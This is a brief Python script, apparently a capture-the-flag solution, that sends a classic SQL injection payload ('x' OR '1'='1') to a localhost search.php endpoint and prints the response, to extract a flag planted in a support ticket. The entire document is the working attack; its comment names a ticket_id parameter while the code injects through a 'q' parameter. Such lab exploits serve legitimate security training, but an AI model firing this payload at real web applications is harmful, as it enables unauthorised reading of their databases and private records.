import requests

# The actual seeded database has the flag directly in a support ticket's notes
# field, reachable via classic SQL injection on the ticket_id parameter.
url = "http://localhost:8081/search.php"

print("[*] Sending SQLi payload to break out of the query...")
payload = "x' OR '1'='1"
r = requests.get(url, params={"q": payload})

print("[*] Server response:")
print(r.text)
